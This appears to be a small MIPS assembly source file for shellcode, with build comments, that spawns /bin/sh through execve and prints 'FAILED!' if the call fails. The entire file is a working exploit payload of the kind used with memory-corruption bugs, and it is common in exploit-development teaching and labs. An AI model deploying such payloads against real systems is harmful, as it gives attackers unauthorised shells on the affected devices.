# Compiling:
# make shellcode debug

# Checking
# mips-linux-gnu-objdump -D shellcode
# mips-linux-gnu-objdump -h shellcode

# include <asm/unistd.h>
.text
.globl __start
__start:
    li      $v0, __NR_execve    # execve(
    la      $a0, arg0           #     "/bin/sh",
    la      $a1, argv           #     [ "/bin/sh" ],
    la      $a2, null           #     NULL
    syscall                     # )

    li      $v0, __NR_write     # write (
    li      $a0, 1              #     stdout,
    la      $a1, err            #     err,
    li      $a2, 7              #     length,
    syscall                     # )

    li      $v0, __NR_exit      # exit (
    syscall                     # )

null: .word 0x0
argv: .word arg0, 0x0
arg0: .asciiz "/bin/sh"
err: .asciiz "FAILED!"
